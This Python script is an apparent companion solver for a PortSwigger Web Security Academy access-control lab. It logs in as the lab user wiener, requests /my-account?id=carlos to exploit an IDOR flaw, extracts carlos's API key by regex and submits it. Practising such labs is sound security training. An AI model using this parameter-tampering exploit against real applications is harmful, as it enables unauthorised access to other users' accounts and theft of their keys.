#!/usr/bin/env python3
"""
User ID controlled by request parameter
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 05-user-id-controlled-by-request-parameter.md

What this does:
    Logs in as wiener and requests /my-account?id=carlos -- the server looks
    up whatever id says and returns it regardless of who's asking. Extracts
    carlos's API key from the rendered page with a regex and submits it
    through the lab's solution endpoint.

Usage:
    python 05-user-id-controlled-by-request-parameter.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def get_csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def login(client: httpx.Client, base: str, username: str, password: str) -> httpx.Response:
    login_page = client.get(f"{base}/login")
    csrf = get_csrf(login_page.text)
    return client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    login(client, lab_url, "wiener", "peter")

    resp = client.get(f"{lab_url}/my-account", params={"id": "carlos"})
    print(f"[*] /my-account?id=carlos: {resp.status_code}")

    key_match = re.search(r'Your API key is:\s*([a-zA-Z0-9]+)', resp.text)
    if not key_match:
        key_match = re.search(r'API [Kk]ey[^<]*?([a-zA-Z0-9]{20,})', resp.text)
    if not key_match:
        key_match = re.search(r'<div[^>]*>([a-zA-Z0-9]{20,})</div>', resp.text)

    if not key_match:
        print("[-] Could not extract API key.")
        print(f"[DEBUG] Response preview: {resp.text[:500]}")
        return

    api_key = key_match.group(1)
    print(f"[+] Carlos API key: {api_key}")

    resp = client.post(f"{lab_url}/submitSolution", data={"answer": api_key})
    print(f"[*] Submitted: {resp.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos's API key stolen via id parameter IDOR.")
    else:
        print("[-] Not solved yet -- confirm the extracted API key.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
